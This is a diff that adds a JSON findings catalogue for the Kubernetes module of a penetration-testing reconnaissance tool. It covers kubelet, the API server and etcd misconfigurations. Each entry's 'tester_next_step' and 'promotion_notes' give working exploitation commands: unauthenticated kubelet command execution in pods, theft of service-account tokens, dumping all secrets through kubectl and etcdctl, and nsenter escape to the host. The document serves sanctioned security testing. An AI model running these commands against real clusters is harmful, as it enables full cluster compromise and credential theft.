@@ -1,0 +1,128 @@
+{
+  "service": "kubernetes",
+  "summary": "Deep and role-aware: probes kubelet (10250 anon /pods, /run exec route, /logs dir), kubelet-ro (10255), kube-apiserver (anon list of ns/secrets/configmaps/serviceaccounts/nodes/clusterrolebindings, SelfSubjectRulesReview for authoritative RBAC map, escape-pod counter), and etcd (v2 keys + v3 maintenance/status). Explicitly does NOT exec, does NOT dump secrets \u2014 leaves those as tester_next_step. Biggest gap: no attempt to actually POST to /run for a canary command (still gated behind ROE) and no service-account-token capture flow that would take it to T3.",
+  "module_files": [
+    "/home/kali/Desktop/projects/recce/recce/services/kubernetes.py"
+  ],
+  "findings": [
+    {
+      "kind": "kubelet_exec",
+      "title_pattern": "Kubelet /run exec route reachable without auth",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "GET /run/{ns}/{pod}/{container} answering non-404 is deterministic proof the exec route exists and would accept POST; no command actually executed.",
+      "can_promote_to": "t2",
+      "promotion_notes": "POST /run/{ns}/{pod}/{container} -d 'cmd=id' \u2014 captures stdout of `id` as proof of RCE inside the target pod. Considered intrusive (arbitrary command inside someone's workload) but non-destructive if scoped to `id`/`hostname`.",
+      "promotion_risk": "high",
+      "tester_next_step": "curl -sk -X POST https://<ip>:10250/run/<ns>/<pod>/<container> -d 'cmd=id' \u2014 RCE inside pod, then cat /var/run/secrets/kubernetes.io/serviceaccount/token to pivot to apiserver."
+    },
+    {
+      "kind": "kubelet_logs_dir",
+      "title_pattern": "Kubelet /logs/ exposes node /var/log without auth",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "GET /logs/ returning a directory listing is the CVE exposure itself; no file actually pulled.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Pull a benign named file (kubelet.log) as a controlled read-back, then flag CVE-2024-9042 on Windows kubelets by parameter injection PoC.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sk https://<ip>:10250/logs/kube-apiserver.log \u2014 read audit logs, extract impersonated identities and bearer tokens; for Windows kubelets, try CVE-2024-9042 payload (parameter injection into file path).",
+      "related_cves": [
+        "CVE-2020-8557",
+        "CVE-2024-9042"
+      ]
+    },
+    {
+      "kind": "kubelet_anon",
+      "title_pattern": "Kubelet allows anonymous access (exec RCE into pods)",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "GET /pods returning 200 with PodList is deterministic proof of anon kubelet; exec RCE follows but isn't launched.",
+      "can_promote_to": "t3",
+      "promotion_notes": "POST /exec/<ns>/<pod>/<container>?command=cat&command=/var/run/secrets/kubernetes.io/serviceaccount/token \u2014 pull SA token, then use it against apiserver to reach cluster-admin (chain to k8s_escape_pods).",
+      "promotion_risk": "high",
+      "tester_next_step": "kubeletctl -i --server <ip> pods; kubeletctl exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' -p <pod> -n <ns> \u2014 token = kubectl access. Try kubectl --token=<X> get secrets -A."
+    },
+    {
+      "kind": "kubelet_ro",
+      "title_pattern": "Kubelet read-only port exposes pod specs (secret leak)",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "Anon GET on 10255 /pods returning PodList = proof; not actively harvesting env values yet.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Parse the pod list and extract every containers[].env[].value that looks credential-shaped (regex like docker.py already has). Wire into known_creds pool.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -s http://<ip>:10255/pods | jq -r '.items[].spec.containers[] | .env[]? | \"\\(.name)=\\(.value)\"' | grep -Ei 'PASS|KEY|TOKEN|URL'"
+    },
+    {
+      "kind": "api_anon_list",
+      "title_pattern": "Kubernetes API allows anonymous resource listing (incl. Secrets)",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "Unauth LIST returning 200 list is deterministic proof; when anon_secrets true this is game-over anon read of the whole secret store \u2014 but recce doesn't actually pull the secret values.",
+      "can_promote_to": "t3",
+      "promotion_notes": "GET /api/v1/secrets and base64-decode each secret.data.*.value; recover service-account tokens (type=kubernetes.io/service-account-token) \u2014 every one is a foothold identity. Non-destructive read.",
+      "promotion_risk": "low",
+      "tester_next_step": "kubectl --server https://<ip>:<port> --insecure-skip-tls-verify get secrets -A -o json | jq -r '.items[] | select(.type==\"kubernetes.io/service-account-token\") | .data.token' | base64 -d \u2014 use each token as a bearer for further kubectl calls."
+    },
+    {
+      "kind": "api_anon_resources",
+      "title_pattern": "Kubernetes API leaks additional resources unauth",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "GET /configmaps /serviceaccounts /nodes /clusterrolebindings returning 200 lists is deterministic proof of the extra unauth surface.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Scan configmaps for embedded secrets (regex on data values), map clusterrolebindings to find any binding of system:anonymous to cluster-admin (immediate T4).",
+      "promotion_risk": "none",
+      "tester_next_step": "kubectl ... get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name==\"system:anonymous\")' \u2014 any hit = the anonymous user IS cluster-admin. kubectl get configmaps -A -o yaml | grep -Ei 'password|token|api_key'"
+    },
+    {
+      "kind": "k8s_escape_pods",
+      "title_pattern": "Kubernetes pods with node-escape configuration",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "Counts of privileged/hostPath/hostPID/hostNetwork pods pulled from anon LIST \u2014 enumeration only, no exec into one.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Chain: use kubelet /exec on a privileged pod to nsenter host root. Requires the kubelet_exec / kubelet_anon finding on the same cluster.",
+      "promotion_risk": "high",
+      "tester_next_step": "kubectl --server https://<ip>:<port> get pods -A -o json | jq -r '.items[] | select(.spec.hostPID==true or (.spec.containers[]?.securityContext.privileged==true)) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'; then via kubelet exec: nsenter -t 1 -m -u -i -n -p sh."
+    },
+    {
+      "kind": "api_anon_open",
+      "title_pattern": "Kubernetes API accepts anonymous requests",
+      "severity": "low",
+      "tier": "t0",
+      "tier_evidence": "Just that a 403 came back \u2014 anonymous auth is enabled but RBAC blocks; no exploit primitive.",
+      "can_promote_to": "t1",
+      "promotion_notes": "SSRR already covers the promotion (surface what verbs anonymous *does* hold); this finding stays informational when SSRR returns empty.",
+      "promotion_risk": "none",
+      "tester_next_step": "kubectl --server https://<ip>:<port> --insecure-skip-tls-verify auth can-i --list --as=system:anonymous \u2014 enumerate verbs anon holds."
+    },
+    {
+      "kind": "api_anon_ssrr",
+      "title_pattern": "Kubernetes API leaks anon RBAC via SelfSubjectRulesReview",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "SSRR POST returning rules bound to system:anonymous is authoritative proof of RBAC misconfiguration; verbs listed but not exercised.",
+      "can_promote_to": "t3",
+      "promotion_notes": "If verbs include create pods -> spawn a privileged pod that mounts /host, reads host root. If impersonate -> POST /api/v1/namespaces with impersonation header for another identity. If create clusterrolebinding -> self-bind to cluster-admin.",
+      "promotion_risk": "high",
+      "tester_next_step": "If mutating verbs present: kubectl --server ... --as=system:anonymous create -f privileged-pod.yaml; else focus on the read verbs already covered by api_anon_list."
+    },
+    {
+      "kind": "etcd_open",
+      "title_pattern": "etcd exposed unauthenticated (all cluster secrets)",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "v2 /v2/keys/?recursive=true 200 with node OR v3 /v3/maintenance/status 200 with expected fields is deterministic proof of anon read; secret bodies not dumped here.",
+      "can_promote_to": "t3",
+      "promotion_notes": "ETCDCTL_API=3 etcdctl get /registry/secrets/ --prefix \u2014 recover every kubernetes secret in plaintext. Full cluster compromise.",
+      "promotion_risk": "medium",
+      "tester_next_step": "ETCDCTL_API=3 etcdctl --endpoints http://<ip>:2379 get /registry/secrets/ --prefix -w json | jq -r '.kvs[] | .value | @base64d' \u2014 decrypt SA tokens and cluster TLS."
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_creds (SA tokens, secrets)",
+    "known_hostkeys (TLS keys in etcd/secrets)",
+    "relay_targets (impersonate identities via SSRR)"
+  ]
+}
